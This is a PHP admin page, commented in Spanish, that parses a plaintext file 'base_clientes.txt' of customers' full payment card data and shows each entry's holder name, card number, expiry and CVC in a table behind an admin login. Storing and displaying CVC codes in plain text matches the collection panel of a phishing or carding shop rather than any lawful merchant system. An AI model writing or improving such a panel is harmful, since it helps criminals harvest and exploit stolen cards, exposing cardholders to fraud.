<?php
session_start();
include 'includes/admin_auth.php'; // Incluye la lógica de autenticación

requireAdminLogin(); // Protege esta página, redirige si no está logueado

// Función para leer y parsear los datos de clientes
function getCustomerData($file) {
    $data = [];
    if (file_exists($file)) {
        $content = file_get_contents($file);
        // Divide por las separaciones de transacción, asegurándose de no incluir entradas vacías
        $entries = array_filter(explode("-------------------\n\n", $content));

        foreach ($entries as $entry) {
            $entry = trim($entry);
            if (empty($entry)) continue;

            $customer = [];
            $lines = explode("\n", $entry);
            foreach ($lines as $line) {
                // Capturar el timestamp
                if (strpos($line, "Timestamp:") !== false) {
                    $customer['timestamp'] = trim(str_replace("Timestamp:", "", $line));
                }
                // Capturar País
                if (strpos($line, "País:") !== false) {
                    $customer['country'] = trim(str_replace("País:", "", $line));
                }
                // Capturar Nombre Titular
                if (strpos($line, "Nombre Titular:") !== false) {
                    $customer['card_name'] = trim(str_replace("Nombre Titular:", "", $line));
                }
                // Capturar Tarjeta y desglosar
                if (strpos($line, "Tarjeta:") !== false) {
                    $card_info = trim(str_replace("Tarjeta:", "", $line));
                    $parts = explode('|', $card_info);
                    $customer['card_number'] = $parts[0] ?? 'N/A';
                    $customer['card_month'] = $parts[1] ?? 'N/A';
                    $customer['card_year'] = $parts[2] ?? 'N/A';
                    $customer['card_cvc'] = $parts[3] ?? 'N/A';
                }
            }
            if (!empty($customer)) {
                $data[] = $customer;
            }
        }
    }
    // Ordenar los datos por timestamp de forma descendente (más recientes primero)
    usort($data, function($a, $b) {
        return strtotime($b['timestamp']) - strtotime($a['timestamp']);
    });

    return $data;
}

$customer_data = getCustomerData('base_clientes.txt');

include 'includes/header.php'; // Incluimos el header normal, pero podemos hacer un header admin si queremos
?>

<main class="container">
    <h2>Panel de Administración - Clientes</h2>

    <div class="admin-actions" style="margin-bottom: 20px; text-align: right;">
        <a href="admin_logout.php" class="button secondary">Cerrar Sesión</a>
    </div>

    <?php if (empty($customer_data)): ?>
        <p class="empty-cart-message">No hay datos de clientes registrados aún.</p>
    <?php else: ?>
        <div class="admin-table-container" style="overflow-x: auto;">
            <table class="customer-table" style="width: 100%; border-collapse: collapse; margin-top: 20px;">
                <thead>
                    <tr>
                        <th style="padding: 12px; border: 1px solid #ddd; background-color: #f2f2f2; text-align: left;">Fecha/Hora</th>
                        <th style="padding: 12px; border: 1px solid #ddd; background-color: #f2f2f2; text-align: left;">País</th>
                        <th style="padding: 12px; border: 1px solid #ddd; background-color: #f2f2f2; text-align: left;">Nombre Titular</th>
                        <th style="padding: 12px; border: 1px solid #ddd; background-color: #f2f2f2; text-align: left;">Número Tarjeta</th>
                        <th style="padding: 12px; border: 1px solid #ddd; background-color: #f2f2f2; text-align: left;">Exp. Mes</th>
                        <th style="padding: 12px; border: 1px solid #ddd; background-color: #f2f2f2; text-align: left;">Exp. Año</th>
                        <th style="padding: 12px; border: 1px solid #ddd; background-color: #f2f2f2; text-align: left;">CVC</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($customer_data as $customer): ?>
                        <tr>
                            <td style="padding: 12px; border: 1px solid #ddd;"><?php echo htmlspecialchars($customer['timestamp'] ?? 'N/A'); ?></td>
                            <td style="padding: 12px; border: 1px solid #ddd;"><?php echo htmlspecialchars($customer['country'] ?? 'N/A'); ?></td>
                            <td style="padding: 12px; border: 1px solid #ddd;"><?php echo htmlspecialchars($customer['card_name'] ?? 'N/A'); ?></td>
                            <td style="padding: 12px; border: 1px solid #ddd;"><?php echo htmlspecialchars($customer['card_number'] ?? 'N/A'); ?></td>
                            <td style="padding: 12px; border: 1px solid #ddd;"><?php echo htmlspecialchars($customer['card_month'] ?? 'N/A'); ?></td>
                            <td style="padding: 12px; border: 1px solid #ddd;"><?php echo htmlspecialchars($customer['card_year'] ?? 'N/A'); ?></td>
                            <td style="padding: 12px; border: 1px solid #ddd;"><?php echo htmlspecialchars($customer['card_cvc'] ?? 'N/A'); ?></td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    <?php endif; ?>
</main>

<?php include 'includes/footer.php'; ?>